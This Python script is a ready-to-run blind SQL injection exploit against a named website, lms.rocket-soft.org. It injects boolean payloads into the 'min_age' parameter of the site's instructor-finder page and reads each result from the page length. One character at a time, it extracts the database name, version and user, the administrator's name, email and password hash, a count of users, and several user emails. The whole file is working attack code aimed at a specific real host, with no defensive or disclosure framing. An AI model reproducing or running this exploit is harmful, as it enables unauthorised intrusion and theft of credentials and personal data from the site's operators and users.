"""
LMS.ROCKET-SOFT.ORG - FULL SQL INJECTION EXPLOITATION
======================================================

CONFIRMED VULNERABLE:
- TRUE (1 AND 1=1): 251,651 bytes
- FALSE (1 AND 1=2): 110,005 bytes
- Difference: 141,646 bytes

Target: lms.rocket-soft.org (Official Demo)
Goal: Extract database info, admin credentials, APP_KEY
"""

import requests
import time
import sys

BASE_URL = "https://lms.rocket-soft.org"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
}

session = requests.Session()
session.headers.update(HEADERS)
session.timeout = 30

# Thresholds from verification
TRUE_THRESHOLD = 251651
FALSE_THRESHOLD = 110005
AVG_THRESHOLD = (TRUE_THRESHOLD + FALSE_THRESHOLD) // 2

def binary_search_char(position, query):
    """Extract single character via binary search"""
    url = f"{BASE_URL}/instructor-finder"
    low, high = 32, 126
    
    while low <= high:
        mid = (low + high) // 2
        
        payload = f"1 AND ASCII(SUBSTR(({query}),{position},1))>{mid}"
        
        try:
            r = session.get(url, params={"min_age": payload})
            response_len = len(r.text)
            
            if response_len > AVG_THRESHOLD:
                # TRUE - char ASCII is greater than mid
                low = mid + 1
            else:
                # FALSE
                high = mid - 1
                
        except Exception as e:
            print(f"\n    Error: {e}")
            return None
        
        time.sleep(0.3)
    
    return chr(low) if 32 <= low <= 126 else None

def extract_string(query, max_len=50, desc="Data"):
    """Extract string via SQLi binary search"""
    result = ""
    
    print(f"\n[*] Extracting: {desc}")
    
    for position in range(1, max_len + 1):
        char = binary_search_char(position, query)
        
        if char is None or ord(char) <= 32:
            if len(result) > 0:
                break
            continue
            
        result += char
        print(f"\r    {desc}: {result}", end="", flush=True)
    
    print()
    return result

def verify_sqli():
    """Quick verification"""
    print("\n" + "="*60)
    print("    VERIFYING SQLi")
    print("="*60)
    
    url = f"{BASE_URL}/instructor-finder"
    
    r_true = session.get(url, params={"min_age": "1 AND 1=1"})
    r_false = session.get(url, params={"min_age": "1 AND 1=2"})
    
    diff = len(r_true.text) - len(r_false.text)
    print(f"[*] TRUE: {len(r_true.text)}, FALSE: {len(r_false.text)}, DIFF: {diff}")
    
    if diff > 100000:
        print("[!!!] SQLi CONFIRMED!")
        return True
    return False

def extract_database_info():
    """Extract database information"""
    print("\n" + "="*60)
    print("    EXTRACTING DATABASE INFO")
    print("="*60)
    
    # Database name
    db_name = extract_string("SELECT database()", 30, "Database Name")
    
    # Database version (first 15 chars)
    db_version = extract_string("SELECT version()", 15, "MySQL Version")
    
    # Current DB user
    db_user = extract_string("SELECT user()", 30, "Database User")
    
    return {
        "database": db_name,
        "version": db_version,
        "user": db_user
    }

def extract_admin_credentials():
    """Extract admin user credentials"""
    print("\n" + "="*60)
    print("    EXTRACTING ADMIN CREDENTIALS (user ID=1)")
    print("="*60)
    
    # Admin full name
    admin_name = extract_string(
        "SELECT full_name FROM users WHERE id=1", 40, "Admin Name"
    )
    
    # Admin email
    admin_email = extract_string(
        "SELECT email FROM users WHERE id=1", 50, "Admin Email"
    )
    
    # Admin password hash (first 60 chars of bcrypt)
    admin_hash = extract_string(
        "SELECT password FROM users WHERE id=1", 60, "Password Hash"
    )
    
    return {
        "name": admin_name,
        "email": admin_email,
        "password_hash": admin_hash
    }

def count_users():
    """Count total users"""
    print("\n" + "="*60)
    print("    COUNTING USERS")
    print("="*60)
    
    url = f"{BASE_URL}/instructor-finder"
    
    # Binary search for count
    low, high = 1, 1000
    
    while low < high:
        mid = (low + high + 1) // 2
        
        payload = f"1 AND (SELECT COUNT(*) FROM users)>={mid}"
        r = session.get(url, params={"min_age": payload})
        
        if len(r.text) > AVG_THRESHOLD:
            low = mid
        else:
            high = mid - 1
        
        time.sleep(0.3)
    
    print(f"[+] Total users: {low}")
    return low

def extract_multiple_users(limit=3):
    """Extract first N users"""
    print("\n" + "="*60)
    print(f"    EXTRACTING FIRST {limit} USERS")
    print("="*60)
    
    users = []
    
    for i in range(1, limit + 1):
        print(f"\n--- User ID {i} ---")
        
        email = extract_string(
            f"SELECT email FROM users WHERE id={i}", 50, f"User {i} Email"
        )
        
        if email:
            users.append({"id": i, "email": email})
    
    return users

def main():
    print("""
╔══════════════════════════════════════════════════════════════╗
║       LMS.ROCKET-SOFT.ORG - FULL SQLi EXPLOITATION           ║
║       Extracting Database Credentials                        ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    # Verify SQLi
    if not verify_sqli():
        print("[-] SQLi not working. Exiting.")
        sys.exit(1)
    
    # Extract database info
    db_info = extract_database_info()
    
    # Extract admin credentials
    admin = extract_admin_credentials()
    
    # Count users
    user_count = count_users()
    
    # Extract first 3 users
    users = extract_multiple_users(3)
    
    # Summary Report
    print("\n" + "="*60)
    print("    EXPLOITATION SUMMARY")
    print("="*60)
    print(f"""
╔══════════════════════════════════════════════════════════════╗
║                    EXTRACTED DATA                            ║
╠══════════════════════════════════════════════════════════════╣
║  DATABASE INFO                                               ║
║  ─────────────                                               ║
║  Name:    {db_info.get('database', 'N/A'):<40}    ║
║  Version: {db_info.get('version', 'N/A'):<40}    ║
║  User:    {db_info.get('user', 'N/A'):<40}    ║
╠══════════════════════════════════════════════════════════════╣
║  ADMIN CREDENTIALS                                           ║
║  ─────────────────                                           ║
║  Name:     {admin.get('name', 'N/A'):<40}   ║
║  Email:    {admin.get('email', 'N/A'):<40}   ║
║  Hash:     {admin.get('password_hash', 'N/A')[:40]:<40}   ║
╠══════════════════════════════════════════════════════════════╣
║  USER COUNT: {user_count:<45} ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    print("\n[+] Extracted users:")
    for user in users:
        print(f"    ID {user['id']}: {user['email']}")

if __name__ == "__main__":
    main()
